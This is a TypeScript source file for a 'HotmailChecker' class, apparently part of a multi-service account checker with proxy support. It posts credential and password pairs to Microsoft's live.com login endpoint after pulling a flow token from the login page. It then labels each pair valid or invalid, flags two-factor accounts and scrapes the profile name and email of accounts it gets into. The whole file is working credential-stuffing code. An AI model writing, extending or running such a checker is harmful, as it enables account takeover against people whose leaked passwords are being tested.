import { BaseChecker } from './base';
import { CheckResult } from '@/types';

export class HotmailChecker extends BaseChecker {
  constructor(proxy?: any, timeout?: number) {
    super('hotmail', proxy, timeout);
  }

  async check(credential: string, password: string): Promise<CheckResult> {
    return this.checkWithFallback(
      credential,
      password,
      this.checkWithCredential.bind(this),
      // Hotmail/Outlook primarily uses email, but may accept phone/username in some cases
      this.isEmail(credential) ? this.checkAsPhone.bind(this) : this.checkAsEmail.bind(this)
    );
  }

  private async checkWithCredential(credential: string, password: string): Promise<CheckResult> {
    try {
      // Get Microsoft login page to extract necessary tokens
      const loginPageResponse = await this.client.get('https://login.live.com/', {
        headers: {
          'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        },
      });

      // Extract flow token and other necessary parameters
      const flowTokenMatch = loginPageResponse.data.match(/sFTTag:'.*?value="([^"]+)"/);
      const correlationIdMatch = loginPageResponse.data.match(/correlationId['"]\s*:\s*['"]([^'"]+)/);
      
      // Login attempt using Microsoft's login endpoint
      const loginData = new URLSearchParams({
        login: credential,
        passwd: password,
        KMSI: '1', // Keep me signed in
        type: '11',
        LoginOptions: '3',
      });

      if (flowTokenMatch?.[1]) {
        loginData.append('flowToken', flowTokenMatch[1]);
      }

      const loginResponse = await this.client.post(
        'https://login.live.com/ppsecure/post.srf',
        loginData.toString(),
        {
          headers: {
            'Content-Type': 'application/x-www-form-urlencoded',
            'Referer': 'https://login.live.com/',
          },
          maxRedirects: 0,
          validateStatus: (status) => status < 400,
        }
      );

      // Check for successful login indicators
      if (loginResponse.status === 302 || 
          loginResponse.headers.location?.includes('live.com') ||
          loginResponse.data?.includes('identity/confirm')) {
        
        const capture = await this.getAccountDetails();
        return this.createResult(credential, password, 'hotmail', 'valid', capture);
      }

      // Check for 2FA requirement
      if (loginResponse.data?.includes('Help us protect your account') ||
          loginResponse.data?.includes('two-step verification')) {
        return this.createResult(credential, password, 'hotmail', 'valid', {
          twoFactorEnabled: true,
        });
      }

      // Check for specific error indicators
      if (loginResponse.data?.includes('Your account or password is incorrect') ||
          loginResponse.data?.includes('sign-in name or password')) {
        return this.createResult(credential, password, 'hotmail', 'invalid');
      }

      return this.createResult(credential, password, 'hotmail', 'invalid');
    } catch (error: any) {
      return this.handleError(error, credential, password);
    }
  }

  private async checkAsPhone(credential: string, password: string): Promise<CheckResult> {
    // Microsoft accepts phone numbers as login, try with original credential
    return this.checkWithCredential(credential, password);
  }

  private async checkAsEmail(credential: string, password: string): Promise<CheckResult> {
    // If username/phone failed, unlikely to work as email for Microsoft
    return this.createResult(credential, password, 'hotmail', 'invalid');
  }

  private async getAccountDetails() {
    try {
      // Try to get account information from Microsoft Live services
      const response = await this.client.get('https://account.live.com/profile', {
        headers: {
          'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        },
      });

      // Parse account information from the HTML response
      const nameMatch = response.data.match(/displayName['"]\s*:\s*['"]([^'"]+)/);
      const emailMatch = response.data.match(/userPrincipalName['"]\s*:\s*['"]([^'"]+)/);
      
      return {
        username: nameMatch?.[1],
        email: emailMatch?.[1],
        emailVerified: true,
        provider: 'Microsoft',
      };
    } catch {
      return {
        provider: 'Microsoft',
        emailVerified: true,
      };
    }
  }
}
